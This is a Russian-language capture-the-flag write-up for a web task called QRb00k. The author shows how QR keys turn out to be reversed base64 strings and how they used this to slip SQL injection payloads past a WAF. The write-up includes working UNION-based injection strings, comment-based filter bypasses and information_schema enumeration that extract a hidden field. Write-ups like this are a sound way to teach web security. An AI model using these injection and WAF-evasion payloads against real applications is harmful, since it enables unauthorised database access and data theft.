## H4CK1T CTF :: QRb00k :: Web (400)

Условие задачи следующее:

`RU: В России было разработан защищенный мессенджер, для общения используется система с qr ключами, что позволяет читать чужие сообщения только владельцам данного ключа. Но как так ли это на самом деле ? Вам и предстоит это выяснить...`

![task](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/task.png)

Задание из категории Web, соответсвенно необходимо проанализировать данный сайт, найти и заэксплуатировать уязвимость чтобы вытащить флаг.

![1](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/1.jpg)

Ну соответсвенно для начала необходимо понять что из себя представляет данный мессенджер, попробуем создать сообщение от пользователя `blablabla`.

![2](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/2.jpg)

В результате мы получаем QR Code с помощью которого можно будет прочитать наше оставленное сообщение.

![3](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/3.jpg)

Попробуем теперь его прочитать с помощью полученного ключа

![4](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/4.jpg)

Как видно ниже в результате мы видим оставленно ранее сообщение `hacktheplanet`, все работает как задумано, осталось найти уязвимость чтобы вытащить заветный флаг.

![5](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/5.jpg)

Итак, первое что приходит на ум это `SQL Injection` :), давайте попробуем повтыкать апострофы и кавычки при создании сообщения ;)

![6](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/6.jpg)

Но не тут то было, сработал `WAF`, ' и " не работают, детектит зараза :)

![7](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/7.jpg)

Перепробовал еще несколько вариантов в том числе зааплоадить php скрипт, но и это тоже задетектил. OK, тогда возвращаемся к нашему QR коду, попробуем разобраться какой именно ключ он генерит... Прочитаем содержимое QR кода

![8](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/8.jpg)

Получили текст `hxmYhxmYhxmY` который очень похож на base64 но при декодинге получается белиберда... но повторяющийся 3 раза паттерн как бы намекает на наше `blablabla` :) попробуем заенкодить его в base64

```shell
bash-3.2$ echo -n "blablabla" | base64
YmxhYmxhYmxh
```
Ок, это наш QR код но в обратном порядке :)
Отлично, теперь мы можем сами сгенерить любой QR код который захотим, пример команды: `echo -n "blablabla" | base64 | rev | qrencode -o payload.png -t PNG`

Теперь давайте попробуем повтыкать кавычки туда :)
`echo -n "blablabla'" | base64 | rev | qrencode -o payload.png -t PNG`

![9](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/9.jpg)

Ураааа, в этот раз WAF этого не заметил, но он по прежнему ругается еще и на пробел и --, но это мы попробуем обойти с помощью `/**/` и `#`. Следующим шагом нам надо убедиться что это реально `SQL Injection` и все работает так как мы думаем :) Попробуем починить запрос чтобы он выдал все сообщения `echo -n "blablabla' or '1'='1" | base64 | rev | qrencode -o payload.png -t PNG`

![10](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/10.jpg)

Ха, `nothig interesting` это не наш текст, но уже хороший знак ) возможно наш будет в следующей строке, давайте проверим `echo -n "blablabla'/**/or/**/'1'='1'/**/LIMIT/**/1,1/**/#" | base64 | rev | qrencode -o payload.png -t PNG`

![11](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/11.jpg)

Бинго! SQLi работает, теперь можем попробывать вывести информацию через UNION, к примеру версию СУБД `echo -n "blablabla'/**/UNION/**/SELECT/**/@@version/**/LIMIT/**/1,1/**/#" | base64 | rev | qrencode -o payload.png -t PNG`

![12](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/12.jpg)

Супер, все работает. Далее я попытался найти другие таблицы в текущей БД, ничего не было кроме текущей `messages`, чтож давайте поищем все столбцы в этой таблице... `echo -n "blablabla'/**/UNION/**/SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/'messages'/**/LIMIT/**/4,1/**/#" | base64 | rev | qrencode -o payload.png -t PNG`

![13](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/13.jpg)

Кажется мы нашли то что искали... `secret_field` я думаю стоит там поискать наш флаг ;) `echo -n "blablabla'/**/UNION/**/SELECT/**/secret_field/**/FROM/**/messages/**/LIMIT/**/1,1/**/#" | base64 | rev | qrencode -o payload.png -t PNG`

![14](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/ctf.com.ua/QRb00k/imgs/14.jpg)

\o/ Ура! Долгожданный флаг в кармане, и +400 очков команде b1n4ry4rms

**Автор: fuzzyf10w**
